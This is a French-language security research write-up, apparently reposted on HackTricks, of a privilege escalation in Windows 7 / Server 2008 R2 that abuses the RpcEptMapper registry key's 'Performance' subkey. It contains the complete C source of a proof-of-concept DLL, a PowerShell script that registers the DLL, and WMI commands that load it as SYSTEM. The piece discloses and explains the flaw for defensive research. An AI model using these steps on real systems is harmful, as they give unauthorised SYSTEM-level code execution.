Selon la sortie du script, l'utilisateur actuel dispose de certaines autorisations d'écriture sur deux clés de registre :

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

Vérifions manuellement les autorisations du service `RpcEptMapper` en utilisant l'interface graphique `regedit`. Une chose que j'aime vraiment dans la fenêtre "Paramètres de sécurité avancés" est l'onglet "Autorisations effectives". Vous pouvez choisir n'importe quel nom d'utilisateur ou de groupe et voir immédiatement les autorisations effectives accordées à ce principal sans avoir besoin d'inspecter toutes les ACE séparément. La capture d'écran suivante montre le résultat pour le compte `lab-user` à faible privilège.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

La plupart des autorisations sont standard (par exemple : `Query Value`), mais une en particulier se distingue : `Create Subkey`. Le nom générique correspondant à cette autorisation est `AppendData/AddSubdirectory`, ce qui correspond exactement à ce qui a été signalé par le script :
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
Cela signifie que nous ne pouvons pas simplement modifier la valeur `ImagePath`, par exemple. Pour le faire, nous aurions besoin de la permission `WriteData/AddFile`. Au lieu de cela, nous ne pouvons créer qu'une nouvelle sous-clé.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03_registry-imagepath-access-denied.png)

Cela signifie-t-il que c'était effectivement un faux positif ? Sûrement pas. Que le plaisir commence !

## RTFM <a href="#rtfm" id="rtfm"></a>

À ce stade, nous savons que nous pouvons créer des sous-clés arbitraires sous `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`, mais nous ne pouvons pas modifier les sous-clés et les valeurs existantes. Ces sous-clés déjà existantes sont `Parameters` et `Security`, qui sont assez courantes pour les services Windows.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04_registry-rpceptmapper-config.png)

Par conséquent, la première question qui m'est venue à l'esprit était : _y a-t-il une autre sous-clé prédéfinie - comme `Parameters` et `Security` - que nous pourrions exploiter pour modifier efficacement la configuration du service et modifier son comportement de quelque manière que ce soit ?_

Pour répondre à cette question, mon plan initial était d'énumérer toutes les clés existantes et d'essayer d'identifier un modèle. L'idée était de voir quelles sous-clés sont _significatives_ pour la configuration d'un service. J'ai commencé à réfléchir à la façon dont je pourrais implémenter cela en PowerShell, puis trier le résultat. Cependant, avant de le faire, je me suis demandé si cette structure de registre était déjà documentée. J'ai donc cherché quelque chose comme `windows service configuration registry site:microsoft.com` et voici le tout premier [résultat](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree) qui est sorti.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05_google-search-registry-services.png)

Cela semble prometteur, n'est-ce pas ? À première vue, la documentation ne semblait pas être exhaustive et complète. Compte tenu du titre, je m'attendais à voir une sorte de structure d'arborescence détaillant toutes les sous-clés et valeurs définissant la configuration d'un service, mais ce n'était clairement pas le cas.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06_doc-registry-services.png)

Cependant, j'ai rapidement examiné chaque paragraphe. Et j'ai rapidement repéré les mots clés "_**Performance**_" et "_**DLL**_". Sous le titre "**Perfomance**", on peut lire ce qui suit :

> **Performance** : _Une clé qui spécifie des informations pour la surveillance facultative des performances. Les valeurs sous cette clé spécifient **le nom de la DLL de performance du pilote** et **les noms de certaines fonctions exportées dans cette DLL**. Vous pouvez ajouter des entrées de valeur à cette sous-clé en utilisant des entrées AddReg dans le fichier INF du pilote._

Selon ce court paragraphe, on peut théoriquement enregistrer une DLL dans un service de pilote afin de surveiller ses performances grâce à la sous-clé `Performance`. **OK, c'est vraiment intéressant !** Cette clé n'existe pas par défaut pour le service `RpcEptMapper`, il semble donc que c'est _exactement_ ce dont nous avons besoin. Il y a cependant un léger problème, ce service n'est certainement pas un service de pilote. Quoi qu'il en soit, cela vaut la peine d'essayer, mais nous avons besoin de plus d'informations sur cette fonctionnalité de "surveillance des performances".

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07_sc-qc-rpceptmapper.png)

> **Remarque :** sous Windows, chaque service a un `Type` donné. Un type de service peut être l'une des valeurs suivantes : `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)` ou `SERVICE_INTERACTIVE_PROCESS (256)`.

Après quelques recherches, j'ai trouvé cette ressource dans la documentation : [Création de la clé de performances de l'application](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key).

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/08_performance-subkey-documentation.png)

Tout d'abord, il y a une belle structure d'arborescence qui liste toutes les clés et valeurs que nous devons créer. Ensuite, la description donne les informations clés suivantes :

* La valeur `Library` peut contenir **un nom de DLL ou un chemin complet vers une DLL**.
* Les valeurs `Open`, `Collect` et `Close` vous permettent de spécifier **les noms des fonctions** qui doivent être exportées par la DLL.
* Le type de données de ces valeurs est `REG_SZ` (ou même `REG_EXPAND_SZ` pour la valeur `Library`).

Si vous suivez les liens inclus dans cette ressource, vous trouverez même le prototype de ces fonctions ainsi que des exemples de code : [Mise en œuvre de OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata).
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
Je pense que c'est suffisant avec la théorie, il est temps de commencer à écrire du code!

## Écrire une preuve de concept <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

Grâce à tous les éléments que j'ai pu collecter dans la documentation, écrire une simple DLL de preuve de concept devrait être assez simple. Mais nous avons encore besoin d'un plan!

Lorsque je dois exploiter une vulnérabilité de détournement de DLL, je commence généralement par une fonction d'aide à la journalisation simple et personnalisée. Le but de cette fonction est d'écrire des informations clés dans un fichier chaque fois qu'elle est appelée. En général, je journalise l'ID du processus en cours et du processus parent, le nom de l'utilisateur qui exécute le processus et la ligne de commande correspondante. Je journalise également le nom de la fonction qui a déclenché cet événement de journalisation. De cette façon, je sais quelle partie du code a été exécutée.

Dans mes autres articles, j'ai toujours sauté la partie développement car j'ai supposé que c'était plus ou moins évident. Mais je veux aussi que mes articles de blog soient accessibles aux débutants, donc il y a une contradiction. Je vais remédier à cette situation en détaillant le processus ici. Alors, lançons Visual Studio et créons un nouveau projet "Application console C++". Notez que j'aurais pu créer un projet "Bibliothèque de liens dynamiques (DLL)", mais je trouve en fait plus facile de simplement commencer par une application console.

Voici le code initial généré par Visual Studio:
```c
#include <iostream>

int main()
{
    std::cout << "Hello World!\n";
}
```
Bien sûr, ce n'est pas ce que nous voulons. Nous voulons créer une DLL, pas un EXE, donc nous devons remplacer la fonction `main` par `DllMain`. Vous pouvez trouver un code squelette pour cette fonction dans la documentation: [Initialiser une DLL](https://docs.microsoft.com/fr-fr/cpp/build/run-time-library-behavior#initialize-a-dll).
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        Log(L"DllMain"); // See log helper function below
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
En parallèle, nous devons également modifier les paramètres du projet pour spécifier que le fichier compilé de sortie doit être un DLL plutôt qu'un EXE. Pour ce faire, vous pouvez ouvrir les propriétés du projet et, dans la section "**Général**", sélectionner "**Bibliothèque dynamique (.dll)**" comme "**Type de configuration**". Juste sous la barre de titre, vous pouvez également sélectionner "**Toutes les configurations**" et "**Toutes les plateformes**" afin que ce paramètre puisse être appliqué globalement.

Ensuite, j'ajoute ma fonction d'aide de journalisation personnalisée.
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
    LPWSTR pwszBuffer, pwszCommandLine;
    WCHAR wszUsername[UNLEN + 1] = { 0 };
    SYSTEMTIME st = { 0 };
    HANDLE hToolhelpSnapshot;
    PROCESSENTRY32 stProcessEntry = { 0 };
    DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
    BOOL bResult = FALSE;

    // Get the command line of the current process
    pwszCommandLine = GetCommandLine();

    // Get the name of the process owner
    GetUserName(wszUsername, &dwPcbBuffer);

    // Get the PID of the current process
    dwProcessId = GetCurrentProcessId();

    // Get the PID of the parent process
    hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
        do {
            if (stProcessEntry.th32ProcessID == dwProcessId) {
                dwParentProcessId = stProcessEntry.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
    }
    CloseHandle(hToolhelpSnapshot);

    // Get the current date and time
    GetLocalTime(&st);

    // Prepare the output string and log the result
    dwBufSize = 4096 * sizeof(WCHAR);
    pwszBuffer = (LPWSTR)malloc(dwBufSize);
    if (pwszBuffer)
    {
        StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
            st.wHour,
            st.wMinute,
            st.wSecond,
            dwProcessId,
            dwParentProcessId,
            wszUsername,
            pwszCommandLine,
            pwszCallingFrom
        );

        LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

        free(pwszBuffer);
    }
}
```
Ensuite, nous pouvons remplir la DLL avec les trois fonctions que nous avons vues dans la documentation. La documentation indique également qu'elles doivent renvoyer `ERROR_SUCCESS` si elles réussissent.
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
    Log(L"OpenPerfData");
    return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
    Log(L"CollectPerfData");
    return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
    Log(L"ClosePerfData");
    return ERROR_SUCCESS;
}
```
D'accord, le projet est maintenant correctement configuré, `DllMain` est implémenté, nous avons une fonction d'aide à la journalisation et les trois fonctions requises. Il ne manque plus qu'une chose. Si nous compilons ce code, `OpenPerfData`, `CollectPerfData` et `ClosePerfData` ne seront disponibles que comme fonctions internes, nous devons donc les **exporter**. Cela peut être réalisé de plusieurs manières. Par exemple, vous pourriez créer un fichier [DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files) et configurer le projet en conséquence. Cependant, je préfère utiliser le mot-clé `__declspec(dllexport)` ([doc](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)), surtout pour un petit projet comme celui-ci. De cette façon, nous devons simplement déclarer les trois fonctions au début du code source.
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
Si vous voulez voir le code complet, je l'ai téléchargé [ici](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12).

Enfin, nous pouvons sélectionner _**Release/x64**_ et "_**Build the solution**_". Cela produira notre fichier DLL : `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`.

## Tester le PoC <a href="#testing-the-poc" id="testing-the-poc"></a>

Avant d'aller plus loin, je m'assure toujours que ma charge utile fonctionne correctement en la testant séparément. Le peu de temps passé ici peut vous faire gagner beaucoup de temps par la suite en vous évitant de vous perdre dans un débogage hypothétique. Pour ce faire, nous pouvons simplement utiliser `rundll32.exe` et passer le nom de la DLL et le nom d'une fonction exportée en tant que paramètres.
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
Super, le fichier journal a été créé et, si nous l'ouvrons, nous pouvons voir deux entrées. La première a été écrite lorsque la DLL a été chargée par `rundll32.exe`. La seconde a été écrite lorsque `OpenPerfData` a été appelé. Ça a l'air bien ! ![:slightly\_smiling\_face:](https://github.githubassets.com/images/icons/emoji/unicode/1f642.png)
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
D'accord, maintenant nous pouvons nous concentrer sur la vulnérabilité réelle et commencer par créer la clé et les valeurs de registre requises. Nous pouvons le faire manuellement en utilisant `reg.exe` / `regedit.exe` ou de manière programmable avec un script. Comme j'ai déjà suivi les étapes manuelles lors de mes recherches initiales, je vais montrer une façon plus propre de faire la même chose avec un script PowerShell. De plus, créer des clés et des valeurs de registre en PowerShell est aussi facile que d'appeler `New-Item` et `New-ItemProperty`, n'est-ce pas? ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)

`L'accès au registre demandé n'est pas autorisé`... Hmmm, d'accord... Il semble que cela ne sera pas si facile après tout. ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

Je n'ai pas vraiment enquêté sur ce problème, mais je suppose que lorsque nous appelons `New-Item`, `powershell.exe` essaie en fait d'ouvrir la clé de registre parente avec certains indicateurs qui correspondent à des autorisations que nous n'avons pas.

Quoi qu'il en soit, si les cmdlets intégrées ne font pas le travail, nous pouvons toujours descendre d'un niveau et invoquer directement les fonctions DotNet. En effet, les clés de registre peuvent également être créées avec le code suivant en PowerShell.
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
Nous y voilà ! Finalement, j'ai rassemblé le script suivant afin de créer la clé et les valeurs appropriées, d'attendre une entrée utilisateur et enfin de terminer en nettoyant tout.
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
La dernière étape maintenant, comment tromper le service RPC Endpoint Mapper pour charger notre DLL Performace? Malheureusement, je n'ai pas suivi toutes les différentes choses que j'ai essayées. Cela aurait été vraiment intéressant dans le contexte de ce billet de blog pour souligner à quel point la recherche peut parfois être fastidieuse et chronophage. Quoi qu'il en soit, une chose que j'ai trouvée en cours de route est que vous pouvez interroger les _Compteurs de performance_ en utilisant WMI (_Windows Management Instrumentation_), ce qui n'est pas trop surprenant après tout. Plus d'informations ici: [_Types de compteurs de performance WMI_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).

> _Les types de compteurs apparaissent en tant que qualificateur CounterType pour les propriétés dans les classes_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _, et en tant que qualificateur CookingType pour les propriétés dans les classes_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _._

Donc, j'ai d'abord énuméré les classes WMI qui sont liées aux _Données de performance_ dans PowerShell en utilisant la commande suivante.
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12\_powershell-get-wmiobject.gif)

Et j'ai vu que mon fichier journal a été créé presque immédiatement ! Voici le contenu du fichier.
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
Je m'attendais à obtenir une exécution de code arbitraire en tant que `NETWORK SERVICE` dans le contexte du service `RpcEptMapper` au maximum, mais il semble que j'ai obtenu un résultat bien meilleur que prévu. J'ai en fait obtenu une exécution de code arbitraire dans le contexte du service `WMI` lui-même, qui s'exécute en tant que `LOCAL SYSTEM`. C'est incroyable, n'est-ce pas ? ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **Remarque:** si j'avais obtenu une exécution de code arbitraire en tant que `NETWORK SERVICE`, je n'aurais été qu'à un jeton du compte `LOCAL SYSTEM` grâce à l'astuce qui a été démontrée par James Forshaw il y a quelques mois dans ce billet de blog : [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).

J'ai également essayé d'obtenir chaque classe WMI séparément et j'ai observé exactement le même résultat.
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## Conclusion <a href="#conclusion" id="conclusion"></a>

Je ne sais pas comment cette vulnérabilité a pu passer inaperçue si longtemps. Une explication possible est que d'autres outils cherchaient probablement un accès en écriture complet dans le registre, alors que `AppendData/AddSubdirectory` était suffisant dans ce cas. En ce qui concerne la "mauvaise configuration" elle-même, je suppose que la clé de registre a été configurée de cette manière pour un objectif spécifique, bien que je ne puisse pas penser à un scénario concret dans lequel les utilisateurs auraient une sorte de permission pour modifier la configuration d'un service.

J'ai décidé d'écrire publiquement sur cette vulnérabilité pour deux raisons. La première est que je l'ai rendue publique - sans le réaliser initialement - le jour où j'ai mis à jour mon script PrivescCheck avec la fonction `GetModfiableRegistryPath`, il y a plusieurs mois. La deuxième raison est que l'impact est faible. Elle nécessite un accès local et n'affecte que les anciennes versions de Windows qui ne sont plus prises en charge (à moins que vous n'ayez acheté le support étendu...). À ce stade, si vous utilisez toujours Windows 7 / Server 2008 R2 sans isoler correctement ces machines dans le réseau d'abord, empêcher un attaquant d'obtenir des privilèges SYSTEM est probablement le moindre de vos soucis.

Outre l'anecdote de cette vulnérabilité d'escalade de privilèges, je pense que ce paramètre de registre "Perfomance" ouvre des opportunités vraiment intéressantes pour l'exploitation postérieure, le mouvement latéral et l'évasion AV/EDR. J'ai déjà quelques scénarios particuliers en tête, mais je ne les ai pas encore testés. À suivre ?…


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
